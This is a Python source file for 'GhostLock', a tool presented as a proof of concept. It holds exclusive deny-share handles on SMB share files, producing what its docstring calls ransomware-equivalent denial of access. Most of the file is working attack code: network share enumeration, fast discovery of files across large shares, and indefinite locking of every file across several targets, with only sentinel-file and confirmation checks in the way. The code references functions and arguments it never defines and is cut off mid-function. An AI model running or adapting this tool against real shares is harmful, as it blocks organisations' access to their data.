#!/usr/bin/env python3
"""
GhostLock — SMB deny-share handle availability research tool.

Demonstrates that a low-privileged user with access to an SMB share can
produce ransomware-equivalent availability impact with zero writes, zero
encryption, and no elevated privilege, using only CreateFileW with
dwShareMode=0 (exclusive handle, no sharing).

- Optional: creates disposable workflow files as the lock target.
- Acquires exclusive deny-share handles on all target files.
- Victim-style workers measure the blocking rate during the hold window.
- All handles are released cleanly on exit regardless of how the script stops.
"""

from __future__ import annotations

import argparse
import concurrent.futures
import ctypes
import datetime as dt
import getpass
import json
import os
from pathlib import Path
import platform
import random
import statistics
import threading
import time
from typing import Any, Callable

# ── ANSI colours ──────────────────────────────────────────────────────────────
RESET   = "\033[0m"
BOLD    = "\033[1m"
DIM     = "\033[2m"
CYAN    = "\033[96m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
RED     = "\033[91m"
MAGENTA = "\033[95m"
WHITE   = "\033[97m"


def enable_ansi() -> None:
    """Enable ANSI VT sequences + UTF-8 on Windows console."""
    if os.name == "nt":
        try:
            k32 = ctypes.windll.kernel32
            k32.SetConsoleOutputCP(65001)
            handle = k32.GetStdHandle(-11)          # STD_OUTPUT_HANDLE
            mode   = ctypes.c_ulong()
            k32.GetConsoleMode(handle, ctypes.byref(mode))
            k32.SetConsoleMode(handle, mode.value | 0x0004)  # ENABLE_VIRTUAL_TERMINAL_PROCESSING
        except Exception:
            pass


MAX_LOCKS = 9999999999999999999999999
MAX_VICTIMS = 64
SENTINEL_NAME = ".ghostlock_authorized"


def now_utc() -> str:
    return dt.datetime.now(dt.timezone.utc).isoformat(timespec="milliseconds")


def safe_name(value: str) -> str:
    return "".join(ch if ch.isalnum() or ch in "-_" else "_" for ch in value).strip("_")


class ExclusiveWindowsHandle:
    def __init__(self, path: Path, access_mode: str = "readwrite"):
        if os.name != "nt":
            raise RuntimeError("This PoC requires Windows SMB client semantics")

        self.path = str(path)
        self.kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        self.kernel32.CreateFileW.argtypes = [
            ctypes.c_wchar_p,
            ctypes.c_uint32,
            ctypes.c_uint32,
            ctypes.c_void_p,
            ctypes.c_uint32,
            ctypes.c_uint32,
            ctypes.c_void_p,
        ]
        self.kernel32.CreateFileW.restype = ctypes.c_void_p
        self.kernel32.CloseHandle.argtypes = [ctypes.c_void_p]
        self.kernel32.CloseHandle.restype = ctypes.c_int

        generic_read = 0x80000000
        generic_write = 0x40000000
        delete_access = 0x00010000
        no_sharing = 0x00000000
        open_existing = 3
        normal = 0x00000080
        if access_mode == "readonly":
            desired_access = generic_read
        elif access_mode == "readwrite":
            desired_access = generic_read | generic_write | delete_access
        else:
            raise ValueError(f"Unsupported access mode: {access_mode}")

        self.handle = self.kernel32.CreateFileW(
            self.path,
            desired_access,
            no_sharing,
            None,
            open_existing,
            normal,
            None,
        )
        invalid_handle = ctypes.c_void_p(-1).value
        if self.handle in (None, invalid_handle):
            err = ctypes.get_last_error()
            raise OSError(err, ctypes.FormatError(err), self.path)

    def close(self) -> None:
        if self.handle:
            self.kernel32.CloseHandle(self.handle)
            self.handle = None


def timed(label: str, func: Callable[[], Any]) -> dict[str, Any]:
    started = time.perf_counter()
    try:
        func()
        return {
            "operation": label,
            "blocked": False,
            "latency_ms": round((time.perf_counter() - started) * 1000, 3),
        }
    except Exception as exc:
        return {
            "operation": label,
            "blocked": True,
            "latency_ms": round((time.perf_counter() - started) * 1000, 3),
            "error": f"{type(exc).__name__}: {exc}",
        }


def append_text(path: Path, value: str) -> None:
    with path.open("a", encoding="utf-8") as handle:
        handle.write(value)


def replace_file(path: Path, value: str) -> None:
    tmp = path.with_name(f".{path.name}.{os.getpid()}.{time.time_ns()}.tmp")
    tmp.write_text(value, encoding="utf-8")
    os.replace(tmp, path)


def victim_worker(
    worker_id: int,
    locked_files: list[Path],
    control_files: list[Path],
    rounds: int,
    read_only: bool,
) -> dict[str, Any]:
    rng = random.Random(worker_id)
    results: list[dict[str, Any]] = []
    if read_only:
        operations = [
            ("read", lambda p: p.read_bytes()),
        ]
    else:
        operations = [
            ("read", lambda p: p.read_text(encoding="utf-8")),
            ("append", lambda p: append_text(p, f"victim={worker_id};ts={now_utc()}\n")),
            ("replace", lambda p: replace_file(p, f"replacement by victim {worker_id} at {now_utc()}\n")),
            ("delete", lambda p: p.unlink()),
        ]

    for _ in range(rounds):
        for target_group, files in (("locked", locked_files), ("control", control_files)):
            path = rng.choice(files)
            op_name, op = rng.choice(operations)
            result = timed(f"{target_group}_{op_name}", lambda p=path, f=op: f(p))
            result["target_group"] = target_group
            result["file"] = path.name
            results.append(result)

    blocked = [item for item in results if item["blocked"]]
    latencies = [item["latency_ms"] for item in results]
    attempts_by_group: dict[str, int] = {}
    blocked_by_group: dict[str, int] = {}
    for item in results:
        group = item["target_group"]
        attempts_by_group[group] = attempts_by_group.get(group, 0) + 1
        if item["blocked"]:
            blocked_by_group[group] = blocked_by_group.get(group, 0) + 1
    return {
        "worker_id": worker_id,
        "attempts": len(results),
        "blocked": len(blocked),
        "attempts_by_group": attempts_by_group,
        "blocked_by_group": blocked_by_group,
        "latency_ms_avg": round(statistics.mean(latencies), 3) if latencies else 0,
        "latency_ms_p95": round(statistics.quantiles(latencies, n=20)[18], 3) if len(latencies) >= 20 else 0,
        "samples": results[:12],
    }


def create_files(base: Path, count: int, prefix: str) -> list[Path]:
    files: list[Path] = []
    for i in range(count):
        path = base / f"{prefix}_{i:04d}.txt"
        path.write_text(
            f"workflow file {prefix} #{i}\ncreated={now_utc()}\n",
            encoding="utf-8",
        )
        files.append(path)
    return files


def path_is_inside(path: Path, parent: Path) -> bool:
    try:
        path.resolve().relative_to(parent.resolve())
        return True
    except ValueError:
        return False


def discover_existing_files(
    target_dir: Path,
    proof_dir: Path,
    locks: int,
    recursive: bool,
    include_glob: str,
) -> list[Path]:
    iterator = target_dir.rglob(include_glob) if recursive else target_dir.glob(include_glob)
    files: list[Path] = []
    for path in iterator:
        if path.name == SENTINEL_NAME:
            continue
        if path_is_inside(path, proof_dir):
            continue
        if path.is_file():
            files.append(path)
        if len(files) >= locks:
            break
    return sorted(files, key=lambda item: str(item).lower())


ACQUIRE_MAX_RETRIES = 3
ACQUIRE_BASE_DELAY  = 0.25   # seconds


def acquire_handles(
    files: list[Path],
    access_mode: str,
    session_id: int = 0,
) -> tuple[list[ExclusiveWindowsHandle], list[Path], list[dict[str, str]]]:
    """Acquire exclusive handles with exponential-backoff retry per file."""
    handles: list[ExclusiveWindowsHandle] = []
    locked:  list[Path] = []
    errors:  list[dict[str, str]] = []

    for path in files:
        last_exc: Exception | None = None
        for attempt in range(ACQUIRE_MAX_RETRIES):
            try:
                handles.append(ExclusiveWindowsHandle(path, access_mode=access_mode))
                locked.append(path)
                last_exc = None
                break
            except Exception as exc:
                last_exc = exc
                if attempt < ACQUIRE_MAX_RETRIES - 1:
                    time.sleep(ACQUIRE_BASE_DELAY * (2 ** attempt))
        if last_exc is not None:
            errors.append({
                "file":    str(path),
                "error":   f"{type(last_exc).__name__}: {last_exc}",
                "session": session_id,
            })

    return handles, locked, errors


# ── File cache ────────────────────────────────────────────────────────────────

CACHE_FILENAME = "ghostlock_cache.json"


def save_file_cache(files: list[Path], proof_dir: Path) -> Path:
    """Persist discovered file list so re-runs skip the scan phase."""
    cache_path = proof_dir / CACHE_FILENAME
    cache_path.write_text(
        json.dumps([str(p) for p in files], indent=2),
        encoding="utf-8",
    )
    return cache_path


def load_file_cache(cache_path: Path) -> list[Path] | None:
    """Load a previously saved file list. Returns None if cache is missing or corrupt."""
    try:
        data = json.loads(cache_path.read_text(encoding="utf-8"))
        paths = [Path(p) for p in data]
        existing = [p for p in paths if p.exists()]
        if not existing:
            return None
        return existing
    except Exception:
        return None


def find_latest_cache(share_path: Path) -> Path | None:
    """Scan share_path for the most recent GhostLock report folder containing a cache."""
    candidates = []
    try:
        with os.scandir(share_path) as it:
            for entry in it:
                if entry.is_dir() and entry.name.startswith("GhostLock_PoC_report_"):
                    cache = Path(entry.path) / CACHE_FILENAME
                    if cache.exists():
                        candidates.append(cache)
    except OSError:
        pass
    if not candidates:
        return None
    return max(candidates, key=lambda p: p.stat().st_mtime)


def summarize_victims(worker_stats: list[dict[str, Any]]) -> dict[str, Any]:
    attempts = sum(item["attempts"] for item in worker_stats)
    blocked = sum(item["blocked"] for item in worker_stats)
    attempts_by_group: dict[str, int] = {}
    blocked_by_group: dict[str, int] = {}
    samples: list[dict[str, Any]] = []
    for item in worker_stats:
        samples.extend(item["samples"])
        for group, count in item.get("attempts_by_group", {}).items():
            attempts_by_group[group] = attempts_by_group.get(group, 0) + count
        for group, count in item.get("blocked_by_group", {}).items():
            blocked_by_group[group] = blocked_by_group.get(group, 0) + count

    by_operation: dict[str, dict[str, int]] = {}
    for sample in samples:
        op = sample["operation"]
        by_operation.setdefault(op, {"samples": 0, "blocked": 0})
        by_operation[op]["samples"] += 1
        if sample["blocked"]:
            by_operation[op]["blocked"] += 1

    return {
        "attempts": attempts,
        "blocked": blocked,
        "blocked_percent": round((blocked / attempts) * 100, 2) if attempts else 0,
        "attempts_by_group": attempts_by_group,
        "blocked_by_group": blocked_by_group,
        "sampled_by_operation": by_operation,
    }


def write_report(result: dict[str, Any], proof_dir: Path) -> None:
    md = [
        "# GhostLock — SMB Deny-Share Impact PoC",
        "",
        f"- Timestamp UTC: `{result['timestamp_utc']}`",
        f"- User: `{result['user']}`",
        f"- Host: `{result['host']}`",
        f"- Share path: `{result['share_path']}`",
        f"- Proof directory: `{result['proof_directory']}`",
        f"- Mode: `{result['mode']}`",
        "",
        "## Impact Summary",
        "",
        f"- Files locked: `{result['parameters']['locks']}`",
        f"- Files requested: `{result['parameters']['locks_requested']}`",
        f"- Hold seconds: `{result['parameters']['hold_seconds']}`",
        f"- Victim workers: `{result['parameters']['victims']}`",
        f"- Victim operations: `{result['parameters']['victim_operations']}`",
        f"- Victim operation attempts: `{result['summary']['attempts']}`",
        f"- Blocked attempts: `{result['summary']['blocked']}`",
        f"- Blocked percent: `{result['summary']['blocked_percent']}%`",
        f"- Attempts by group: `{json.dumps(result['summary']['attempts_by_group'], sort_keys=True)}`",
        f"- Blocked by group: `{json.dumps(result['summary']['blocked_by_group'], sort_keys=True)}`",
        f"- Lock acquisition errors: `{len(result['lock_errors'])}`",
        "",
        "## Interpretation",
        "",
        "A low-privileged user with access to files can hold SMB deny-share handles on files they can open. "
        "While those handles are active, other clients attempting allowed operations receive sharing violations or access errors. "
        "This is a real availability impact inside a shared workflow path, even though no storage-admin privilege is used.",
        "",
        result["safety"],
        "",
        "All handles were released before the script exited.",
        "",
        "## Admin-Side Evidence",
        "",
        "Full raw results are in `lock_impact_result.json`.",
        "",
    ]
    (proof_dir / "lock_impact_result.md").write_text("\n".join(md), encoding="utf-8")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Controlled SMB deny-share availability-impact PoC.")
    parser.add_argument(
        "share_path",
        nargs="?",
        default=None,
        help="UNC or mapped share path. Omit to launch interactive mode.",
    )
    parser.add_argument("--proof-name", default="GhostLock_PoC")
    parser.add_argument("--locks", type=int, default=64, help=f"Files to lock, max {MAX_LOCKS}.")
    parser.add_argument("--hold-seconds", type=int, default=60, help="Seconds to hold locks (ignored when --hold-indefinite is set).")
    parser.add_argument(
        "--hold-indefinite",
        action="store_true",
        help="Hold locks until Ctrl+C instead of a fixed duration. Handles are still cleanly released on exit.",
    )
    parser.add_argument("--victims", type=int, default=16, help=f"Victim worker threads, max {MAX_VICTIMS}.")
    parser.add_argument("--rounds", type=int, default=20, help="Operation rounds per victim worker.")
    parser.add_argument(
        "--existing-folder",
        action="store_true",
        help=(
            "Lock existing files in the supplied folder instead of creating a proof "
            "workflow. Requires a sentinel file and --confirm-existing-lock."
        ),
    )
    parser.add_argument(
        "--confirm-existing-lock",
        action="store_true",
        help="Required with --existing-folder to confirm you intend to lock existing files.",
    )
    parser.add_argument(
        "--targets-file",
        default=None,
        help="JSON targets file produced by ghostlock_enum.py. Runs against all enabled entries.",
    )
    parser.add_argument(
        "--include-glob",
        default="*",
        help="With --existing-folder, select files matching this glob. Default: *",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if os.name != "nt":
        raise SystemExit("This PoC must be run from Windows.")

    print_banner()

    # No positional arg → check for targets-file or drop into single-target interactive mode
    if args.share_path is None:
        if args.targets_file:
            return run_multi_target(Path(args.targets_file))
        return interactive_run()
    if args.locks < 1 or args.locks > MAX_LOCKS:
        raise SystemExit(f"--locks must be between 1 and {MAX_LOCKS}")
    if not args.hold_indefinite and (args.hold_seconds < 1):
        raise SystemExit("--hold-seconds must be >= 1, or use --hold-indefinite for no time limit")
    if args.victims < 1 or args.victims > MAX_VICTIMS:
        raise SystemExit(f"--victims must be between 1 and {MAX_VICTIMS}")

    share_path = Path(args.share_path)
    if not share_path.exists() or not share_path.is_dir():
        raise SystemExit(f"Share path does not exist or is not a directory: {share_path}")

    stamp = dt.datetime.now().strftime("%Y%m%d_%H%M%S")
    mode = "existing_folder" if args.existing_folder else "proof_workflow"
    lock_errors: list[dict[str, str]] = []
    access_mode = "readwrite"
    read_only_victims = False

    if args.existing_folder:
        if not args.confirm_existing_lock:
            raise SystemExit("--existing-folder requires --confirm-existing-lock")
        sentinel = share_path / SENTINEL_NAME
        if not sentinel.exists():
            raise SystemExit(
                "Refusing to lock existing files without sentinel. Create this file first: "
                f"{sentinel}"
            )

        proof_dir = share_path / f"{safe_name(args.proof_name)}_report_{stamp}"
        proof_dir.mkdir(parents=False, exist_ok=False)
        locked_files = discover_existing_files(
            share_path,
            proof_dir,
            args.locks,
            args.recursive,
            args.include_glob,
        )
        if not locked_files:
            raise SystemExit(f"No existing files matched {args.include_glob!r} in {share_path}")
        access_mode = "readonly"
        read_only_victims = True
    else:
        proof_dir = share_path / f"{safe_name(args.proof_name)}_{stamp}"
        proof_dir.mkdir(parents=False, exist_ok=False)
        locked_dir = proof_dir / "locked_workflow"
        locked_dir.mkdir()
        locked_files = create_files(locked_dir, args.locks, "locked")

    control_dir = proof_dir / "control_workflow"
    control_dir.mkdir()
    control_files = create_files(control_dir, max(8, min(len(locked_files), 64)), "control")

    handles: list[ExclusiveWindowsHandle] = []
    result: dict[str, Any]
    started = time.monotonic()
    try:
        handles, locked_files, lock_errors = acquire_handles(locked_files, access_mode)
        if not locked_files:
            raise SystemExit("No files could be locked. See lock errors in console output.")

        with concurrent.futures.ThreadPoolExecutor(max_workers=args.victims) as executor:
            futures = [
                executor.submit(
                    victim_worker,
                    worker_id,
                    locked_files,
                    control_files,
                    args.rounds,
                    read_only_victims,
                )
                for worker_id in range(args.victims)
            ]

            # Keep locks alive for admin-side observation after victims finish.
            worker_stats = [future.result() for future in concurrent.futures.as_completed(futures)]
            if args.hold_indefinite:
                print(f"[*] {len(locked_files)} files locked. Holding indefinitely — press Ctrl+C to release.")
                try:
                    while True:
                        time.sleep(5)
                        elapsed = int(time.monotonic() - started)
                        print(f"[*] Holding... {elapsed}s elapsed, {len(locked_files)} files still locked.")
                except KeyboardInterrupt:
                    print("\n[*] Ctrl+C received — releasing handles.")
            else:
                deadline = time.monotonic() + args.hold_seconds
                remaining = deadline - time.monotonic()
                if remaining > 0:
                    time.sleep(remaining)

        summary = summarize_victims(worker_stats)
        result = {
            "timestamp_utc": now_utc(),
            "duration_seconds": round(time.monotonic() - started, 3),
            "user": getpass.getuser(),
            "host": platform.node(),
            "share_path": str(share_path),
            "proof_directory": str(proof_dir),
            "mode": mode,
            "parameters": {
                "locks": len(locked_files),
                "locks_requested": args.locks,
                "hold_seconds": "indefinite" if args.hold_indefinite else args.hold_seconds,
                "victims": args.victims,
                "rounds": args.rounds,
                "existing_folder": args.existing_folder,
                "recursive": args.recursive,
                "include_glob": args.include_glob,
                "access_mode": access_mode,
                "victim_operations": "read_only" if read_only_victims else "read_append_replace_delete",
            },
            "locked_files": [str(path) for path in locked_files],
            "lock_errors": lock_errors,
            "summary": summary,
            "worker_stats": sorted(worker_stats, key=lambda item: item["worker_id"]),
            "safety": (
                "Existing files were opened read-only with deny-share handles; victim attempts were read-only."
                if args.existing_folder
                else "Only files under this proof directory were created and locked."
            ),
        }
    finally:
        for handle in handles:
            handle.close()

    (proof_dir / "lock_impact_result.json").write_text(json.dumps(result, indent=2), encoding="utf-8")
    write_report(result, proof_dir)

    print(f"[+] Proof directory: {proof_dir}")
    print(f"[+] JSON report:     {proof_dir / 'lock_impact_result.json'}")
    print(f"[+] Markdown report: {proof_dir / 'lock_impact_result.md'}")
    print(f"[+] Files locked: {args.locks}")
    print(f"[+] Victim operation attempts: {result['summary']['attempts']}")
    print(f"[+] Blocked attempts: {result['summary']['blocked']} ({result['summary']['blocked_percent']}%)")
    print("[+] All handles released.")
    return 0


BANNER = (
    f"\n"
    +     f"  {CYAN}{BOLD}  ___ _  _  ___  ___ _____{RESET}{CYAN} _    ___   ___ _  __{RESET}\n"
    +     f"  {CYAN}{BOLD} / __| || |/ _ \\/ __|_   _|{RESET}{CYAN}| |  / _ \\ / __| |/ /{RESET}\n"
    +     f"  {CYAN}{BOLD}| (_ | __ | (_) \\__ \\ | |{RESET}{CYAN}| |_| (_) | (__| ' < {RESET}\n"
    +     f"  {CYAN}{BOLD} \\___|_||_|\\___/|___/ |_|{RESET}{CYAN}|____\\___/ \\___|_|\\_\\{RESET}\n"
    + f"\n"
    + f"  {DIM}usage:{RESET}  {CYAN}ghostlock.py{RESET} {DIM}[path] [options]{RESET}\n"
    + f"\n"
    + f"  {YELLOW}options:{RESET}\n"
    + f"    {GREEN}--hold-indefinite{RESET}          hold locks until Ctrl+C\n"
    + f"    {GREEN}--hold-seconds{RESET} {DIM}N{RESET}            hold for N seconds\n"
    + f"    {GREEN}--locks{RESET} {DIM}N{RESET}                   max files to lock\n"
    + f"    {GREEN}--existing-folder{RESET}          lock existing files\n"
    + f"    {GREEN}--confirm-existing-lock{RESET}    required with --existing-folder\n"
    + f"    {GREEN}--recursive{RESET}                recurse into subdirectories\n"
    + f"    {GREEN}--targets-file{RESET} {DIM}FILE{RESET}         JSON targets file\n"
    + f"    {GREEN}--victims{RESET} {DIM}N{RESET}                 victim simulation workers\n"
    + f"\n"
    + f"  {DIM}interactive menu:{RESET}\n"
    + f"    {CYAN}[1]{RESET}  Manual path     — lock all files under a UNC path\n"
    + f"    {CYAN}[2]{RESET}  Auto-discover   — find shares, pick which to lock\n"
    + f"    {CYAN}[3]{RESET}  Directory lock  — namespace blackout, one handle {DIM}(v2){RESET}\n"
    + f"  {CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}\n"
)


def print_banner() -> None:
    enable_ansi()
    print(BANNER)


# ── Fast parallel file discovery ──────────────────────────────────────────────

def _scan_one_dir(
    directory: Path,
    sentinel_name: str,
    proof_dir: Path,
) -> tuple[list[Path], list[Path]]:
    """Return (files, subdirs) for a single directory — called from thread pool."""
    files: list[Path] = []
    subdirs: list[Path] = []
    try:
        with os.scandir(directory) as it:
            for entry in it:
                if entry.name == sentinel_name:
                    continue
                p = Path(entry.path)
                if path_is_inside(p, proof_dir):
                    continue
                try:
                    if entry.is_file(follow_symlinks=False):
                        files.append(p)
                    elif entry.is_dir(follow_symlinks=False):
                        subdirs.append(p)
                except OSError:
                    pass
    except (PermissionError, OSError):
        pass
    return files, subdirs


def discover_files_fast(
    root: Path,
    sentinel_name: str,
    proof_dir: Path,
    max_workers: int = 32,
) -> list[Path]:
    """
    Parallel recursive file discovery using os.scandir + ThreadPoolExecutor.

    Each directory listing is a separate SMB round-trip, so running them
    concurrently across many threads dramatically cuts wall-clock time on
    large shares (e.g. 3 TB with tens of thousands of directories).
    """
    all_files: list[Path] = []
    files_lock = threading.Lock()
    counter = [0]          # live display counter

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        pending: set[concurrent.futures.Future] = {
            executor.submit(_scan_one_dir, root, sentinel_name, proof_dir)
        }
        while pending:
            done, pending = concurrent.futures.wait(
                pending, return_when=concurrent.futures.FIRST_COMPLETED
            )
            new_dirs: list[Path] = []
            for fut in done:
                files, subdirs = fut.result()
                with files_lock:
                    all_files.extend(files)
                    counter[0] += len(files)
                new_dirs.extend(subdirs)

            for d in new_dirs:
                pending.add(executor.submit(_scan_one_dir, d, sentinel_name, proof_dir))

            # Live progress (overwrites same line)
            print(
                f"  {CYAN}[*]{RESET} Scanning ...  "
                f"{GREEN}{counter[0]:>7,}{RESET} files found  "
                f"{DIM}({len(pending)} dirs pending){RESET}   ",
                end="\r", flush=True,
            )

    print()   # newline after the \r progress line
    return all_files


def load_targets_file(path: Path) -> list[str]:
    """Load and validate a targets file produced by ghostlock_enum.py."""
    data = json.loads(path.read_text(encoding="utf-8"))
    targets = data.get("targets", [])
    enabled = [t["unc"] for t in targets if t.get("enabled") is True and t.get("unc")]
    return enabled


def run_multi_target(targets_file: Path) -> int:
    """Run GhostLock interactively against each enabled target in a targets file."""
    try:
        enabled = load_targets_file(targets_file)
    except Exception as exc:
        print(f"  {RED}[!]{RESET} Failed to load targets file: {exc}")
        return 1

    if not enabled:
        print(
            f"  {YELLOW}[!]{RESET} No enabled targets found in {targets_file.name}.\n"
            f"      Open the file and set {CYAN}\"enabled\": true{RESET} for each authorized target."
        )
        return 1

    print(f"\n  {GREEN}[+]{RESET} {len(enabled)} enabled target(s):\n")
    for i, unc in enumerate(enabled, 1):
        print(f"    {DIM}{i:>2}.{RESET} {CYAN}{unc}{RESET}")

    confirm = input(
        f"\n  {CYAN}[?]{RESET} Proceed against all {len(enabled)} target(s)? {DIM}[y/N]{RESET} : "
    ).strip().lower()
    if confirm != "y":
        print(f"  {YELLOW}[~]{RESET} Aborted.")
        return 0

    results_summary: list[dict] = []

    for idx, unc in enumerate(enabled, 1):
        print(f"\n  {CYAN}{'─'*54}{RESET}")
        print(f"  {BOLD}Target {idx}/{len(enabled)}:{RESET} {CYAN}{unc}{RESET}")
        print(f"  {CYAN}{'─'*54}{RESET}\n")

        share_path = Path(unc)

        # Sentinel check
        sentinel = share_path / SENTINEL_NAME
        if not sentinel.exists():
            print(
                f"  {RED}[!]{RESET} Sentinel missing on {unc}.\n"
                f"      Create: {YELLOW}New-Item -ItemType File \"{sentinel}\"{RESET}\n"
                f"  {YELLOW}[~]{RESET} Skipping this target.\n"
            )
            results_summary.append({"unc": unc, "status": "skipped_no_sentinel"})
            continue

        if not share_path.exists():
            print(f"  {RED}[!]{RESET} Path unreachable: {unc}. Skipping.\n")
            results_summary.append({"unc": unc, "status": "skipped_unreachable"})
            continue

        # Cache check
        cached_files: list[Path] | None = None
        latest_cache = find_latest_cache(share_path)
        if latest_cache:
            age_minutes = round((time.time() - latest_cache.stat().st_mtime) / 60)
            use_cache = input(
                f"  {CYAN}[?]{RESET} Cache found ({age_minutes} min ago). Use it? {DIM}[Y/n]{RESET} : "
            ).strip().lower()
            if use_cache != "n":
                cached_files = load_file_cache(latest_cache)
                if cached_files:
                    print(f"  {GREEN}[+]{RESET} Loaded {len(cached_files):,} paths from cache.")

        # Discovery
        stamp     = dt.datetime.now().strftime("%Y%m%d_%H%M%S")
        proof_dir = share_path / f"GhostLock_PoC_report_{stamp}"
        proof_dir.mkdir(parents=False, exist_ok=False)

        if cached_files:
            all_files    = cached_files
            elapsed_scan = 0.0
        else:
            print(f"  {CYAN}[*]{RESET} Discovering files ...\n")
            t0        = time.monotonic()
            all_files = discover_files_fast(share_path, SENTINEL_NAME, proof_dir)
            elapsed_scan = round(time.monotonic() - t0, 1)
            if not all_files:
                print(f"  {RED}[!]{RESET} No files found. Skipping.\n")
                results_summary.append({"unc": unc, "status": "skipped_no_files"})
                continue
            save_file_cache(all_files, proof_dir)
            print(f"  {GREEN}[+]{RESET} {len(all_files):,} files discovered in {elapsed_scan}s")

        # Acquire
        print(f"  {CYAN}[*]{RESET} Acquiring handles ...")
        handles, locked_files, lock_errors = acquire_handles(all_files, "readonly")
        if not locked_files:
            print(f"  {RED}[!]{RESET} No handles acquired. Skipping.\n")
            results_summary.append({"unc": unc, "status": "skipped_no_handles"})
            continue

        print(
            f"  {GREEN}[+]{RESET} {GREEN}{BOLD}{len(locked_files):,}{RESET} handles acquired "
            f"{DIM}({len(lock_errors)} skipped){RESET}"
        )

        # Hold
        started = time.monotonic()
        print(f"\n  {MAGENTA}[*]{RESET} Holding locks — {YELLOW}Ctrl+C{RESET} to release this target and move to next.\n")
        try:
            while True:
                time.sleep(5)
                elapsed = int(time.monotonic() - started)
                print(
                    f"  {MAGENTA}[~]{RESET} {CYAN}{unc[:40]}{RESET}  "
                    f"{YELLOW}{elapsed:>5}s{RESET}  |  {GREEN}{len(locked_files):,}{RESET} locked   ",
                    end="\r", flush=True,
                )
        except KeyboardInterrupt:
            print(f"\n\n  {YELLOW}[*]{RESET} Releasing handles for {unc} ...")
        finally:
            for h in handles:
                h.close()

        duration = round(time.monotonic() - started, 1)
        results_summary.append({"unc": unc, "status": "completed", "locked": len(locked_files), "duration_s": duration})
        print(f"  {GREEN}[+]{RESET} {unc} — done. {len(locked_files):,} files held for {duration}s\n")

    # Final summary
    print(f"\n  {CYAN}{'━'*54}{RESET}")
    print(f"  {BOLD}Multi-target run complete.{RESET}\n")
    for r in results_summary:
        status = r["status"]
        col    = GREEN if status == "completed" else YELLOW
        print(f"  {col}{r['unc']}{RESET}  {DIM}{status}{RESET}")
    print()
    return 0


# ── Network share discovery (integrated enum) ─────────────────────────────────

def _probe_share(unc: str) -> dict:
    """Quick accessibility probe — read-only, no handles acquired."""
    result = {"unc": unc, "accessible": False, "files_sample": 0, "error": None}
    try:
        p = Path(unc)
        entries = list(p.iterdir())
        result["accessible"]    = True
        result["files_sample"]  = sum(1 for e in entries if e.is_file())
        result["dirs_sample"]   = sum(1 for e in entries if e.is_dir())
    except PermissionError:
        result["accessible"] = True
        result["error"]      = "PermissionError"
    except Exception as exc:
        result["error"] = str(exc)
    return result


def discover_network_shares() -> list[dict]:
    """Enumerate visible SMB shares using net view + WNetEnumResource."""
    import ctypes
    import ctypes.wintypes
    import subprocess

    shares: list[dict] = []

    # ── Try WNetEnumResource ──────────────────────────────────────────────────
    try:
        mpr = ctypes.WinDLL("mpr")

        class NETRESOURCEW(ctypes.Structure):
            _fields_ = [
                ("dwScope",       ctypes.wintypes.DWORD),
                ("dwType",        ctypes.wintypes.DWORD),
                ("dwDisplayType", ctypes.wintypes.DWORD),
                ("dwUsage",       ctypes.wintypes.DWORD),
                ("lpLocalName",   ctypes.wintypes.LPWSTR),
                ("lpRemoteName",  ctypes.wintypes.LPWSTR),
                ("lpComment",     ctypes.wintypes.LPWSTR),
                ("lpProvider",    ctypes.wintypes.LPWSTR),
            ]

        h = ctypes.wintypes.HANDLE()
        if mpr.WNetOpenEnumW(2, 1, 0, None, ctypes.byref(h)) == 0:
            buf_size = ctypes.wintypes.DWORD(32768)
            buf      = ctypes.create_string_buffer(buf_size.value)
            count    = ctypes.wintypes.DWORD(0xFFFFFFFF)
            while True:
                buf_size.value = 32768
                count.value    = 0xFFFFFFFF
                ret = mpr.WNetEnumResourceW(h, ctypes.byref(count), buf, ctypes.byref(buf_size))
                if ret == 259:  # ERROR_NO_MORE_ITEMS
                    break
                if ret != 0:
                    break
                offset = 0
                for _ in range(count.value):
                    nr = NETRESOURCEW.from_buffer_copy(buf, offset)
                    if nr.lpRemoteName and nr.dwDisplayType == 3:
                        shares.append({"unc": nr.lpRemoteName, "comment": nr.lpComment or ""})
                    offset += ctypes.sizeof(NETRESOURCEW)
            mpr.WNetCloseEnum(h)
    except Exception:
        pass

    # ── Fallback: net view ────────────────────────────────────────────────────
    if not shares:
        try:
            out = subprocess.check_output(["net", "view", "/all"], stderr=subprocess.DEVNULL,
                                          timeout=30, text=True)
            for line in out.splitlines():
                line = line.strip()
                if line.startswith("\\\\"):
                    server = line.split()[0]
                    try:
                        s_out = subprocess.check_output(["net", "view", server],
                                                        stderr=subprocess.DEVNULL, timeout=15, text=True)
                        for sline in s_out.splitlines():
                            parts = sline.split()
                            if len(parts) >= 2 and parts[1].strip().upper() == "DISK":
                                shares.append({"unc": f"{server}\\{parts[0].strip()}", "comment": ""})
                    except Exception:
                        pass
        except Exception:
            pass

    # Deduplicate
    seen: set[str] = set()
    unique: list[dict] = []
    for s in shares:
        k = s["unc"].lower()
        if k not in seen:
            seen.add(k)
            unique.append(s)
    return unique


def enum_menu() -> list[Path]:
    """
    Discover network shares, probe them, let user select multiple to lock.
    Returns list of selected Path objects.
    """
    print(f"\n  {CYAN}[*]{RESET} Scanning visible SMB shares on the network ...\n")
    shares = discover_network_shares()

    if not shares:
        print(f"  {RED}[!]{RESET} No shares discovered. Check network connectivity and domain membership.")
        return []

    print(f"  {GREEN}[+]{RESET} {len(shares)} shares found. Probing accessibility ...\n")

    results: list[dict] = []
    for i, share in enumerate(shares, 1):
        unc = share["unc"]
        print(f"  {DIM}[{i:>3}/{len(shares)}]{RESET} {unc:<55}", end="\r", flush=True)
        probe = _probe_share(unc)
        ok    = probe["accessible"]
        col   = GREEN if ok else RED
        tag   = "OK " if ok else "NO "
        print(
            f"  [{col}{tag}{RESET}] {unc:<55} "
            f"{DIM}{probe.get('files_sample', 0):>4} files visible{RESET}"
            + " " * 10
        )
        results.append({"unc": unc, "accessible": ok, "comment": share.get("comment", "")})

    accessible = [r for r in results if r["accessible"]]
    if not accessible:
        print(f"\n  {RED}[!]{RESET} No accessible shares found.")
        return []

    # ── Multi-select menu ─────────────────────────────────────────────────────
    print(f"\n  {CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
